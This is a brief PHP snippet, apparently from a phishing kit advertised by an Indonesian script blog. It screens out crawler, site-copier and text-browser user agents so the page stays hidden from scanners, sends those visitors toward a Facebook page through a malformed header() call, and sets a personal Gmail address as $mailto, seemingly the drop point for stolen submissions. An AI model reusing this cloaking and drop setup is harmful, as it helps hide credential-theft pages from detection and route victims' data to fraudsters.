<!-- https://www.rabiitch.ga/ - Kujungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/RaBiitch1945');
die();
}
$mailto = "sarminkardiansyah612@gmail.com";
?>